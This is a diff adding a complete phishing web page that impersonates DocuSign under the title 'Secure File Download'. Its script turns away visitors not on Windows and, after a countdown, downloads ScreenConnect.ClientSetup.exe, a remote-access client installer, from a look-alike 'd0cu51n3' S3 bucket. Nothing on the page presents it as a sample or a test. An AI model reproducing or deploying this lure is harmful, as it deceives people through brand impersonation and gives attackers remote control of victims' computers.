@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Secure File Download</title>
+
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #f4f6f8;
+      font-family: "Segoe UI", Arial, sans-serif;
+      color: #333;
+    }
+
+    .container {
+      background-color: #ffffff;
+      width: 460px;
+      padding: 28px;
+      box-shadow: 0 6px 24px rgba(0, 0, 0, 0.15);
+      border-radius: 6px;
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+      border-top: 6px solid #1f5ea8;
+    }
+
+    .section {
+      text-align: center;
+      line-height: 26px;
+    }
+
+    /* Visibility control */
+    .desktop-only { display: none; }
+    .mobile-only { display: block; }
+
+    @media (min-width: 1024px) {
+      .desktop-only { display: block; }
+      .mobile-only { display: none; }
+    }
+
+    h1 {
+      margin: 0;
+      font-size: 22px;
+      color: #1f5ea8;
+      font-weight: 600;
+    }
+
+    h4 {
+      margin: 0;
+      font-size: 15px;
+      font-weight: 600;
+      color: #1f5ea8;
+    }
+
+    .notice {
+      background-color: #f0f7ff;
+      border: 1px solid #d6e8ff;
+      padding: 12px;
+      border-radius: 4px;
+      font-size: 14px;
+      color: #2b2b2b;
+    }
+
+    .primary-button {
+      background-color: #1f5ea8;
+      color: #ffffff;
+      border: none;
+      padding: 12px 32px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 15px;
+      font-weight: 600;
+    }
+
+    .primary-button:hover {
+      background-color: #184d8c;
+    }
+
+    .progress-container {
+      width: 100%;
+      background-color: #e6e9ec;
+      border-radius: 10px;
+      overflow: hidden;
+      height: 10px;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background-color: #f5c400;
+      transition: width 0.5s ease;
+    }
+
+    .muted {
+      font-size: 13px;
+      color: #666;
+    }
+
+    i {
+      color: #888;
+      font-size: 12px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+
+    <!-- MOBILE ONLY -->
+    <div class="section notice mobile-only">
+      <strong>Desktop recommended</strong><br>
+      Please open this secure file on a laptop or desktop computer.
+    </div>
+
+    <!-- DESKTOP ONLY -->
+    <div class="section desktop-only">
+      <h1>DocuSign</h1>
+    </div>
+
+    <div class="section desktop-only">
+      Install the new DocuSign Desktop App to open your secured document.
+    </div>
+
+    <div class="section desktop-only muted">
+      The download will begin automatically in
+      <strong><span id="countdown">5</span> seconds</strong>.
+    </div>
+
+    <div class="section desktop-only progress-container">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <div class="section notice desktop-only">
+      Please keep this window open while the secure file downloads.
+    </div>
+
+    <div class="section desktop-only">
+      <h4>Or download immediately</h4>
+      <button class="primary-button" onclick="downloadFile()">
+        Download Secure File
+      </button>
+    </div>
+
+    <div class="section desktop-only">
+      <i>If the download does not start, click the button again.</i>
+    </div>
+
+  </div>
+
+  <script>
+  const downloadUrl = "https://d0cu51n3.s3.us-east-2.amazonaws.com/ScreenConnect.ClientSetup.exe";
+  const countdownEl = document.getElementById('countdown');
+  const progressBar = document.getElementById('progressBar');
+  const desktopSections = document.querySelectorAll('.desktop-only');
+  const mobileSections = document.querySelectorAll('.mobile-only');
+  let countdown = 5;
+
+  function isWindows() {
+    return navigator.userAgent.indexOf("Windows") !== -1;
+  }
+
+  function blockAccess() {
+    document.querySelector('.container').innerHTML = `
+      <div class="section notice">
+        <strong>Access Restricted</strong><br><br>
+        This secure file is only accessible from a Windows desktop device.
+        <br><br>
+        Please open this link using a Windows computer.
+      </div>
+    `;
+  }
+
+  function downloadFile() {
+    window.location.href = downloadUrl;
+  }
+
+  function startCountdown() {
+    const interval = setInterval(() => {
+      countdown--;
+      countdownEl.textContent = countdown;
+
+      const progress = ((5 - countdown) / 5) * 100;
+      progressBar.style.width = progress + "%";
+
+      if (countdown <= 0) {
+        clearInterval(interval);
+        downloadFile();
+      }
+    }, 1000);
+  }
+
+  window.addEventListener('load', () => {
+    if (!isWindows()) {
+      blockAccess();
+      return;
+    }
+
+    // Hide mobile warning if Windows detected
+    mobileSections.forEach(el => el.style.display = "none");
+    desktopSections.forEach(el => el.style.display = "block");
+
+    startCountdown();
+  });
+</script>
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"f87f52325f5a47a3be0745acde12e881","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"f87f52325f5a47a3be0745acde12e881","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"62a7d4f6e27a44099abbaffb7b867cd2","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
